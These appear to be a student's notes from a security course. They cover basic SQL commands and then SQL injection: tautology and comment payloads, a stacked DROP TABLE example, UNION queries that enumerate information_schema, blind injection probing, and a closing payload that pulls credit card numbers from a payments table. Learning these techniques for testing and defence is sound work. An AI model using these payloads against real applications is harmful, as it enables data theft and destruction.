https://sqlbolt.com 
	interactive tutorials 1-11, 13
https://www.w3schools.com/SQL/sql_syntax.asp
^--------------basic commands--------------^

mysql
  puts you in sql console
SELECT
	Extracts data from a database
  ie. select * session.car;
    extract everything from the car table within the database session
UNION
	Used to combine the result-set of two or more SELECT statements
	ie. select * from car UNION select tireid,name,size,cost,1,2 FROM Tires;
	need to have same amount of collumns or won't work
USE
	Selects the DB to use
	   allows you to basically use relative paths
	   kinda like CDing into a directory
UPDATE
	Updates data in a database
DELETE
	Deletes data from a database
INSERT INTO
	Inserts new data into a database
show databases
  shows databases in a hierarchical format
CREATE DATABASE
	Creates a new database
ALTER DATABASE
	Modifies a database
CREATE TABLE
	Creates a new table
ALTER TABLE
	Modifies a table
DROP TABLE
	Deletes a table
show tables
  shows tables
  ex. show tables from session;
CREATE INDEX
	Creates an index (search key)
DROP INDEX
  Deletes an index

have to confirm sql is running through ps -elf or whatever means before you can exploit it

SPL Injection considerations:
	requres valid SQL Queries
Fully patched systems can be vulnerable due to misconfiguration
inpt field sanitizatiom 
	put info in, cleans up on the back end; if not there essentially just entering raw sql
	unsanitized vs sanitized fields
		unsanitized:
			input fields can be found using a single quote
				will return extraneous information
				' closes a variable, to allow for additional statements/clauses
				may show no errors or genereic error (harder injection)
		sanitized:
			input fields are checked for items that might harm the database (items are removed, escaped or turned into a sigle string)
		validation:
			checks inputs to ensureit meets a criteria (string doesn't contain ')
string vs integer values
is INFORMAITON)SCHEMA database available?
GET request vs POST request HTTP methods

' OR 1='1 
	baseline sql injection
you can chain multiple statements toether using a semi-colon ;
	ie. Select * FROM user WHERE id=' Johnny'; DROP TABLE Customers; --'
		if an ID exists named Johnny, it's deleting the customers table

nesting statements
	some sweb applications + SQL database combinations don't allow stacking, such as PHP and MySQL though they may allow for nesting a statement within an existing one:
		php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

# or -- tells the database to ignore everything following
Server-Side Query:
SELECT product FROM item WHERE id = $select limit 1;
Input to Inject:
1 or 1=1; #
Server-Side Query becomes:
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;

SQL Injection (Nesting) - DEMO NOTES
username=tom' OR 1='1 & passwd=tom' OR 1='1
	try random creds to see how it responds
		you can learn a lot from error messages
	see if it's vulnerable with ' and see response
		if given any sort of sql errors, the device is vulnerable to sql injection
	try tom 1=1
	enumerate with inspect element and page source
	pay attention to the get requests and url
	goal is to identify how these parameters are getting sent to the server so we can send our own to the server

blind injection
	includes statements to determine how databse is configued
		what should/are we seeing back
	Used when unsanitized fields give generic or no error messages
		normal query to pull epxected output:
			php?item=4
		blind injection for validation:
			ph?item=4 OR 1=1
	TRY ALL COMBINATIONS!!! ITEM=1,ITEM=2,ITEM-3,ETC.
UNION DEMO NOTES
	Selection=2 UNION SELECT 1,name,3 from Tires
	UNION SELECT 1,2@@version
		sql version
	UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
		gives all the information about the database
	
GOLDEN STATEMENT
	can be used in post and get with minimal editing
	find in slack
	 UNION select table_schema,table_name,column_name FROM information_schema.columns ;#

GENERIC SQL INJECTION:
	UNION select <column> from <database>.<table>



UNION select creditcard_number FROM sqlinjection.payments








